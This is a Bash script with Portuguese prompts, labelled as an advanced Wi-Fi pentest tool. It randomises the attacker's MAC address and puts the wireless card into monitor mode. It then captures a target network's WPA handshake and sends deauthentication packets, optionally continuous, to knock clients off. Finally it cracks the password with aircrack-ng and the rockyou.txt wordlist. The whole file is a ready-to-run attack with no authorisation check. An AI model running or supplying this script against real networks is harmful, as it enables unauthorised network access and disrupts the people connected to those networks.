#!/bin/bash

clear
echo "===== PENTEST WI-FI AVANÇADO ====="
echo ""

# Função para restaurar rede
restaurar_rede() {
    echo "[+] Restaurando configurações..."
    sudo airmon-ng stop $INTERFACE &> /dev/null
    sudo systemctl restart NetworkManager
    sudo ifconfig $INTERFACE down
    sudo macchanger -r $INTERFACE &> /dev/null  # Novo MAC aleatório
    sudo ifconfig $INTERFACE up
    echo "[+] MAC alterado para: $(macchanger -s $INTERFACE | grep Current)"
}

# Lista interfaces
echo "[+] Interfaces disponíveis:"
ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
echo ""
read -p "Digite a interface (ex: wlan0): " INTERFACE

# Verifica interface
if ! ip link show $INTERFACE &> /dev/null; then
    echo "[ERRO] Interface $INTERFACE não existe!"
    exit 1
fi

# Prepara ambiente
echo ""
echo "[+] Preparando interface..."
sudo systemctl stop NetworkManager &> /dev/null
sudo airmon-ng check kill &> /dev/null
sudo ifconfig $INTERFACE down
sudo macchanger -r $INTERFACE &> /dev/null
sudo ifconfig $INTERFACE up
sudo airmon-ng start $INTERFACE &> /dev/null

# Lista redes
echo ""
echo "[+] Listando redes (Ctrl+C para parar)..."
sudo airodump-ng $INTERFACE

# Inputs do usuário
echo ""
read -p "Digite o BSSID alvo (MAC): " BSSID
read -p "Digite o canal: " CHANNEL
read -p "Nome do arquivo .cap (sem extensão): " FILE_NAME
read -p "MAC do cliente específico (ou deixe em branco): " CLIENT_MAC

# Captura handshake
CAP_PATH="$(pwd)/${FILE_NAME}-01.cap"
echo ""
echo "[+] Iniciando captura em: $CAP_PATH"
xterm -hold -e "sudo airodump-ng --bssid $BSSID -c $CHANNEL -w $FILE_NAME $INTERFACE" &

# Ataque deauth
echo ""
read -p "Quantos pacotes de deauth? (0=contínuo): " PACKETS
if [ -z "$CLIENT_MAC" ]; then
    xterm -hold -e "sudo aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE" &
else
    xterm -hold -e "sudo aireplay-ng --deauth $PACKETS -a $BSSID -c $CLIENT_MAC $INTERFACE" &
fi

# Opção de brute force
echo ""
read -p "Deseja quebrar a senha agora com rockyou.txt? (s/n): " BRUTE
if [[ $BRUTE =~ [sS] ]]; then
    if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
        echo "[+] Iniciando brute force..."
        xterm -hold -e "sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt $CAP_PATH" &
    else
        echo "[ERRO] rockyou.txt não encontrado em /usr/share/wordlists/"
    fi
fi

# Finalização
echo ""
echo "[+] Pressione ENTER para restaurar a interface..."
read
restaurar_rede
echo "[+] Pronto! By @SeuNome"
